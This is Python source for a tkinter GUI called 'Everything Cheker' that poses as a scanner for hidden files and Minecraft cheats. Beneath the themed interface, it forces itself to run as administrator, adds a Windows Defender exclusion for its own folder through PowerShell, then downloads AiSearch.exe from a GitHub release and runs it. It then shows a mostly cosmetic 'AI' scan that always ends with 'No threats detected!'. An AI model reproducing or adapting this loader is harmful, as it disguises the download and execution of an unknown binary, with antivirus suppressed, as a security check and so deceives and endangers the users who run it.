import tkinter as tk
from tkinter import ttk
import threading
import time
import random
import requests
import os
import tempfile
import hashlib
import subprocess
import sys
import ctypes




from pefile import set_bitfields_format

DOWNLOAD_URL = "https://github.com/SSDDAA-AFK/Everything_cheker/releases/download/v1.0/AiSearch.exe"

FOLDER = os.path.join(os.path.expanduser("~"), "Documents", "Checker")
os.makedirs(FOLDER, exist_ok=True)

FILENAME = os.path.join(FOLDER, "AiSearch.exe")
THEME_FILE = os.path.join(FOLDER, "theme.txt")

ICON_URL = "https://raw.githubusercontent.com/SSDDAA-AFK/Everything_cheker/main/icon.ico"
ICON_PATH = os.path.join(tempfile.gettempdir(), "icon.ico")

SCAN_LIST_URL = "https://github.com/SSDDAA-AFK/Everything_cheker/releases/download/v1.0/scanlist.txt"  # ← СЮДА СВОЙ URL
SCAN_LIST_PATH = os.path.join(FOLDER, "scanlist.txt")

FOUND_FILES = []
SUSPICIOUS_FILES = []
AI_SUSPECTS = []

BG = "#2B1A12"
CARD = "#3A2318"
ACCENT = "#FD9B23"
BAR = "#E28250"
TEXT = "#FDF8EB"
SUB = "#FCD19D"

THEMES = {

    "Orange": {
        "BG": "#2B1A12",
        "CARD": "#3A2318",
        "ACCENT": "#FD9B23",
        "BAR": "#E28250",
        "TEXT": "#FDF8EB",
        "SUB": "#FCD19D"
    },

    "Midnight Purple": {
        "BG": "#0b0614",
        "CARD": "#160b2e",
        "ACCENT": "#a855f7",
        "BAR": "#7c3aed",
        "TEXT": "#ede9fe",
        "SUB": "#c4b5fd"
    },

    "Ice Gray": {
        "BG": "#0f1115",
        "CARD": "#1c1f26",
        "ACCENT": "#9ca3af",
        "BAR": "#6b7280",
        "TEXT": "#f9fafb",
        "SUB": "#d1d5db"
    },

    "Red Alert": {
        "BG": "#1a0404",
        "CARD": "#2a0808",
        "ACCENT": "#ef4444",
        "BAR": "#dc2626",
        "TEXT": "#fee2e2",
        "SUB": "#fca5a5"
    },

    "Purple Neon": {
        "BG": "#12001a",
        "CARD": "#1f002b",
        "ACCENT": "#c77dff",
        "BAR": "#9d4edd",
        "TEXT": "#f3e8ff",
        "SUB": "#d0bfff"
    },

    "Forest": {
        "BG": "#0f1f17",
        "CARD": "#172f25",
        "ACCENT": "#4ade80",
        "BAR": "#22c55e",
        "TEXT": "#ecfdf5",
        "SUB": "#a7f3d0"
    },

    "Solar Light": {
        "BG": "#faf08c",
        "CARD": "#f2d86f",
        "ACCENT": "#ca8a04",
        "BAR": "#eab308",
        "TEXT": "#422006",
        "SUB": "#78350f"
    }
}



class LoaderApp:

    def __init__(self, root):

        self.downloaded = False
        self.current_theme = self.load_theme()

        self.total_files = 0
        self.scanned_files = 0

        if not self.is_admin():

            self.restart_as_admin()

        self.root = root
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.title("Everything Cheker V1.0")
        self.root.geometry("460x280")
        if self.download_icon():
            self.root.iconbitmap(ICON_PATH)
        self.root.resizable(False, False)
        self.root.configure(bg=BG)

        self.card = tk.Frame(
            root,
            bg=CARD,
            width=420,
            height=240
        )
        self.card.place(relx=0.5, rely=0.5, anchor="center")

        # Тень (подложка)
        self.title_shadow = tk.Label(
            self.card,
            text="🧿 Hidden Files Scan",
            font=("Segoe UI", 20, "bold"),
            fg="#000000",
            bg=CARD
        )
        self.title_shadow.place(x=22, y=12)

        # Основной заголовок
        self.title = tk.Label(
            self.card,
            text="🧿 Hidden Files Scan",
            font=("Segoe UI", 20, "bold"),
            fg=ACCENT,
            bg=CARD
        )
        self.title.place(x=20, y=10)

        self.label = tk.Label(
            self.card,
            text="🔄 Loading check...",
            bg=CARD,
            fg=TEXT,
            font=("Segoe UI", 12)
        )
        self.label.pack(pady=(45, 5))

        style = ttk.Style()
        style.theme_use("clam")

        style.configure(
            "Main.Horizontal.TProgressbar",
            background=BAR,
            troughcolor=BG,
            thickness=16,
            bordercolor=ACCENT,
            lightcolor=ACCENT,
            darkcolor=BAR
        )

        self.progress = ttk.Progressbar(
            self.card,
            style="Main.Horizontal.TProgressbar",
            orient="horizontal",
            length=340,
            mode="determinate"
        )
        self.progress.pack(pady=15)

        self.status = tk.Label(
            self.card,
            text="⏳ Preparation...",
            bg=CARD,
            fg=SUB,
            font=("Segoe UI", 10)
        )
        self.status.pack()

        self.theme_btn = tk.Button(
            self.card,
            text="🎨 Theme",
            command=self.switch_theme,
            bg=CARD,
            fg=ACCENT,
            font=("Segoe UI", 9, "bold"),
            relief="raised",
            bd=1,
            cursor="hand2"
        )
        self.theme_btn.pack(pady=5)

        t = threading.Thread(target=self.stage1, daemon=True)
        self.apply_theme(animated=False)
        t.start()

    def on_close(self):
        try:
            self.root.destroy()
        except:
            pass

        os._exit(0)

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def restart_as_admin(self):

        params = " ".join([f'"{arg}"' for arg in sys.argv])

        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",  # ← Запуск як адмін
            sys.executable,
            params,
            None,
            1
        )

        sys.exit(0)

    def download_icon(self):

        try:
            r = requests.get(ICON_URL, timeout=10)

            with open(ICON_PATH, "wb") as f:
                f.write(r.content)

            return True

        except:
            return False

    def download_scan_list(self):

        try:
            r = requests.get(SCAN_LIST_URL, timeout=15)

            with open(SCAN_LIST_PATH, "w", encoding="utf-8") as f:
                f.write(r.text)

            return True

        except:
            return False

    def count_files(self):

        count = 0

        for root_dir, dirs, files in os.walk(os.path.expanduser("~")):
            count += len(files)

        self.total_files = count

    def load_scan_list(self):

        if not os.path.exists(SCAN_LIST_PATH):
            return []

        with open(SCAN_LIST_PATH, "r", encoding="utf-8") as f:
            return [line.strip().lower() for line in f if line.strip()]

    def scan_files(self):

        self.root.after(0, lambda: self.label.config(
            text="🔍 Start scanning..."
        ))

        targets = self.load_scan_list()

        if not targets:
            return

        found = []

        self.scanned_files = 0

        for root_dir, dirs, files in os.walk(os.path.expanduser("~")):

            for file in files:

                self.scanned_files += 1

                percent = int(
                    (self.scanned_files / self.total_files) * 100
                )

                # Оновлюємо прогрес
                self.root.after(0, lambda p=percent: (
                    self.progress.config(value=p),
                    self.status.config(text=f"Scanning: {p}%")
                ))

                name = file.lower()

                if name in targets:
                    full_path = os.path.join(root_dir, file)
                    found.append(full_path)

        global FOUND_FILES
        FOUND_FILES = found

    def ai_analyze_files(self):

        suspects = []

        keywords = [
            "inject", "cheat", "hack", "bypass",
            "aimbot", "loader", "exploit",
            "client", "modmenu", "overlay"
        ]

        mc_paths = [
            ".minecraft",
            "tlauncher",
            "launcher",
            "versions",
            "mods"
        ]

        self.scanned_files = 0

        for root_dir, dirs, files in os.walk(os.path.expanduser("~")):

            for file in files:

                self.scanned_files += 1

                percent = int(
                    (self.scanned_files / self.total_files) * 100
                )

                self.root.after(0, lambda: self.label.config(
                    text="🌍 AI scanning..."
                ))

                # Прогрес
                self.root.after(0, lambda p=percent: (
                    self.progress.config(value=p),
                    self.status.config(text=f"AI Analyze: {p}%")
                ))

                if not (
                        file.lower().endswith(".exe")
                        or file.lower().endswith(".dll")
                ):
                    continue

                path = os.path.join(root_dir, file)

                score = 0

                name = file.lower()
                full = path.lower()

                # 1. Ім'я
                for k in keywords:
                    if k in name:
                        score += 2

                # 2. Minecraft папки
                for p in mc_paths:
                    if p in full:
                        score += 2

                try:
                    size = os.path.getsize(path) / 1024 / 1024

                    # 3. Малий розмір
                    if size < 10:
                        score += 1

                    # 4. Строки всередині
                    with open(path, "rb") as f:
                        data = f.read(50000).lower()

                        for k in keywords:
                            if k.encode() in data:
                                score += 2

                    # 5. Hash
                    sha = hashlib.sha256(
                        open(path, "rb").read()
                    ).hexdigest()

                    if sha.startswith("0000"):
                        score += 1

                except:
                    continue

                # Поріг AI
                if score >= 5:
                    suspects.append({
                        "path": path,
                        "score": score
                    })

        global AI_SUSPECTS
        AI_SUSPECTS = suspects

    # def analyze_behavior(self):
    #
    #     suspects = []
    #
    #     self.scanned_files = 0
    #
    #     for root_dir, dirs, files in os.walk(os.path.expanduser("~")):
    #
    #         for file in files:
    #
    #             self.scanned_files += 1
    #
    #             percent = int(
    #                 (self.scanned_files / self.total_files) * 100
    #             )
    #
    #             self.root.after(0, lambda p=percent: (
    #                 self.progress.config(value=p),
    #                 self.status.config(text=f"Analyzing: {p}%")
    #             ))
    #
    #             if not file.lower().endswith(".exe"):
    #                 continue
    #
    #             path = os.path.join(root_dir, file)
    #
    #             try:
    #                 size = os.path.getsize(path) / 1024 / 1024
    #
    #                 score = 0
    #
    #                 if size < 5:
    #                     score += 1
    #
    #                 if "program files" not in path.lower():
    #                     score += 1
    #
    #                 if score >= 2:
    #                     suspects.append(path)
    #
    #             except:
    #                 pass
    #
    #     global SUSPICIOUS_FILES
    #     SUSPICIOUS_FILES = suspects

    def show_full_results(self):

        theme = THEMES[self.current_theme]

        bg = theme["BG"]
        card = theme["CARD"]
        accent = theme["ACCENT"]
        text = theme["TEXT"]
        sub = theme["SUB"]
        bar = theme["BAR"]

        if not FOUND_FILES and not AI_SUSPECTS:
            return

        win = tk.Toplevel(self.root)
        win.title("🛡 Scan Results")
        win.geometry("650x420")
        if self.download_icon():
            win.iconbitmap(ICON_PATH)
        win.configure(bg=bg)

        def create_box(title, color, items, is_ai=False):

            tk.Label(
                win,
                text=title,
                bg=card,
                fg=color,
                font=("Segoe UI", 12, "bold")
            ).pack(pady=(8, 0))

            box = tk.Listbox(
                win,
                bg=bg,
                fg=text,
                height=7,
                selectbackground=accent,
                selectforeground=bg,
                highlightthickness=0,
                relief="flat",
                borderwidth=0
            )
            box.pack(fill="x", padx=10)

            if is_ai:
                for i in items:
                    box.insert(
                        tk.END,
                        f"[RISK {i['score']}] {i['path']}"
                    )
            else:
                for i in items:
                    box.insert(tk.END, i)

            def open_path(event):

                sel = box.curselection()

                if not sel:
                    return

                data = box.get(sel[0])

                if is_ai:
                    path = data.split("] ", 1)[1]
                else:
                    path = data

                os.startfile(os.path.dirname(path))

            box.bind("<Double-Button-1>", open_path)

        # По іменах
        create_box(
            "📌 Found by name",
            ACCENT,
            FOUND_FILES
        )

        # AI
        create_box(
            "🧠 AI Minecraft Cheats",
            "#f59e0b",
            AI_SUSPECTS,
            is_ai=True
        )

    def switch_theme(self):

        keys = list(THEMES.keys())
        index = keys.index(self.current_theme)

        next_index = (index + 1) % len(keys)

        self.current_theme = keys[next_index]

        # СОХРАНЯЕМ
        self.save_theme()

        # ПРИМЕНЯЕМ
        self.apply_theme(animated=True)

    def add_defender_exclusion(self):

        try:
            folder = FOLDER

            command = f'Add-MpPreference -ExclusionPath "{folder}"'

            subprocess.run([
                "powershell",
                "-Command",
                command
            ], shell=True)

            print("Defender exclusion added")

        except Exception as e:
            print("Defender error:", e)

    def stage1(self):

        self.add_defender_exclusion()
        # Скачиваем список
        self.download_scan_list()

        # Скачиваем EXE
        threading.Thread(target=self.download, daemon=True).start()

        self.run_bar(8, 15, "Downloading")

        while not self.downloaded:
            time.sleep(0.2)

        try:
            os.startfile(os.path.abspath(FILENAME))

            self.stage2()

        except:
            self.label.config(text="❌ ERROR for startup")

    def stage2(self):

        self.root.after(0, lambda: self.label.config(
            text="📂 Counting files..."
        ))

        self.progress["value"] = 0

        # Рахуємо
        self.count_files()

        # Пошук по базі
        self.scan_files()

        # AI-анализ
        self.ai_analyze_files()

        self.finish()

        if FOUND_FILES or AI_SUSPECTS:
            self.show_full_results()

    def run_bar(self, min_t, max_t, text):

        total = random.randint(min_t, max_t)
        delay = total / 100

        for i in range (101):

            time.sleep(delay)

            self.progress["value"] = i

            self.status.config(text=f"{text}: {i}%")

            # Обновляем цвет через главный поток
            self.root.after(0, self.update_label_color)

    def save_theme(self):

        try:
            with open(THEME_FILE, "w", encoding="utf-8") as f:
                f.write(self.current_theme)

            print("Theme saved:", self.current_theme)

        except Exception as e:
            print("Save error:", e)

    def load_theme(self):

        # Якщо файла ще нема — створюємо
        if not os.path.exists(THEME_FILE):

            default = list(THEMES.keys())[0]

            try:
                with open(THEME_FILE, "w", encoding="utf-8") as f:
                    f.write(default)

                return default

            except:
                return default

        # Якщо файл є — читаємо
        try:
            with open(THEME_FILE, "r", encoding="utf-8") as f:

                name = f.read().strip()

                if name in THEMES:
                    return name

        except:
            pass

        # Якщо щось пішло не так — дефолт
        return list(THEMES.keys())[0]

    def apply_theme(self, animated=True):

        theme = THEMES[self.current_theme]

        if animated:
            self.fade_theme(theme)
        else:
            self.set_colors(theme)

    def set_colors(self, theme):

        self.root.configure(bg=theme["BG"])
        self.card.configure(bg=theme["CARD"])

        self.title.configure(
            bg=theme["CARD"],
            fg=theme["ACCENT"]
        )
        self.title_shadow.configure(
            bg=theme["CARD"]
        )
        self.label.configure(
            bg=theme["CARD"],
            fg=theme["TEXT"],
            activeforeground=theme["TEXT"]
        )
        self.status.configure(
            bg=theme["CARD"],
            fg=theme["SUB"]
        )

        style = ttk.Style()

        self.theme_btn.configure(
            bg=theme["ACCENT"],
            fg=theme["BG"],
            activebackground=theme["BAR"],
            activeforeground=theme["TEXT"]
        )

        style.configure(
            "Main.Horizontal.TProgressbar",
            background=theme["BAR"],
            troughcolor=theme["BG"],
            bordercolor=theme["ACCENT"],  # ← ВАЖЛИВО
            lightcolor=theme["ACCENT"],
            darkcolor=theme["BAR"]
        )
        self.progress.update_idletasks()
        self.card.update_idletasks()
        self.root.update_idletasks()
        self.root.after(0, self.update_label_color)

    def fade_theme(self, theme):

        for i in range(10):
            self.root.after(i * 15, lambda t=theme: self.set_colors(t))

    def update_label_color(self):

        theme = THEMES[self.current_theme]

        self.label.configure(
            fg=theme["TEXT"],
            bg=theme["CARD"]
        )

    def download(self):

        try:

            r = requests.get(DOWNLOAD_URL, stream=True)

            with open(FILENAME, "wb") as f:

                for chunk in r.iter_content(1024):
                    if chunk:
                        f.write(chunk)

            self.downloaded = True

        except:
            self.downloaded = False

    def finish(self):

        self.root.after(
            0,
            lambda: self.label.config(
                text="✅ No threats detected!"
            )
        )

        self.status.config(text="Press any button to close the program")

        self.root.bind("<Key>", self.close_app)
        self.root.bind("<Button>", self.close_app)

    def close_app(self, event=None):
        self.on_close()

root = tk.Tk()
app = LoaderApp(root)
root.mainloop()